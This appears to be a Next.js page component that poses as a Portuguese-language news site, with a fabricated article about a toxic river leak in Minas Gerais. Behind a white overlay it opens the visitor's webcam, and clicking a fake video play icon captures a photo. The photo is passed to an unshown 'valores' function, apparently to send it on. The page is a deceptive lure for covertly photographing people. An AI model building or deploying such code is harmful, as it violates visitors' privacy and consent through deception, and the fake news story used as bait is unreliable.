'use client'
import { useRef, useEffect } from "react";
import { valores } from "./getall";
export default function Home() {
  const referencia = useRef<HTMLVideoElement>(null);
  const referenciaCanva = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          if (referencia.current) {
            referencia.current.srcObject = stream;
            referencia.current.play();
          }
        })
        .catch(error => {
          console.log('error');
        });
    }
  }, []);

  const takePhoto = () => {
    if (referencia.current && referenciaCanva.current) {
      const canvas = referenciaCanva.current.getContext('2d');
      if (canvas) {
        canvas.drawImage(referencia.current, 0, 0, referenciaCanva.current.width, referenciaCanva.current.height);
        const dataUrl = referenciaCanva.current.toDataURL('image/jpeg');
        const imageBlob = dataURLToBlob(dataUrl);
        const file = new File([imageBlob], 'photo.jpeg', { type: 'image/jpeg' });
        valores(file);
      }
    }
  };

  function dataURLToBlob(dataUrl: string) {
    const arr = dataUrl.split(',');
    const mime = arr[0].match(/:(.*?);/);
    if (!mime) {
      throw new Error('Invalid data URL');
    }
    const mimeType = mime[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) {
      u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], { type: mimeType });
  }

  return (
    <div className="max-w-5xl">

      <canvas ref={referenciaCanva}></canvas>
      <video className="w-full h-full" ref={referencia} autoPlay></video>
      <div className="top-0 bg-white absolute w-full h-full">
        <header className=" shadow-sm py-2 box-shadow text-sm sm:text-xl text-[#ff3859] ">
          <div className="flex justify-between items-center sm:max-w-3xl xl:max-w-5xl max-w-sm mx-auto">
            <div className="font-bold">
              nv news
            </div>
            <div className="flex gap-10 text-xs sm:text-lg font-bold">
              <div>Home</div>
              <div>Notícias</div>
              <div>Curiosidades</div>
            </div>
          </div>

        </header>
        <div className="sm:max-w-3xl xl:max-w-5xl max-w-sm  m-auto flex items-center flex-col justify-center mt-3 gap-24">
          <div>
            <h1 className="text-2xl font-extrabold">Vazamento Tóxico Contamina Rio nas Cidades do entorno</h1>
            <p className="text-[#666666] text-sm leading-7">Caso aconteceu neste último domingo, dia 23 de abril, em Minas Gerais</p>
          </div>
          <div onClick={takePhoto} className="cursor-pointer full flex justify-center items-center">
            <img className="w-28 h-28" src="./video.png" alt="" />
          </div>
          <div className="w-full">
            <div className="leading-7 text-lg mb-3 w-2/3 text-left">
              <p className="text-[#666666]">
                Um vazamento tóxico de origem ainda desconhecida contaminou o rio, gerando alarme entre os moradores e autoridades locais. O incidente ocorreu durante a noite, quando uma substância de cor estranha e odor forte foi detectada por pescadores que vivem às margens do rio.
                Equipes de emergência foram imediatamente despachadas para conter o vazamento e iniciar os esforços de limpeza, mas os danos ambientais já são evidentes. Peixes mortos começaram a aparecer na superfície da água, e a vegetação ao redor do rio exibe sinais de deterioração devido à contaminação.
                Autoridades de saúde pública emitiram alertas para que os moradores evitem o contato com a água do rio e não consumam peixes capturados na região até que a extensão da contaminação seja totalmente avaliada. Enquanto isso, investigações estão em andamento para identificar a fonte do vazamento e responsabilizar os culpados por esse desastre ambiental que ameaça a vida selvagem e a saúde da comunidade.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
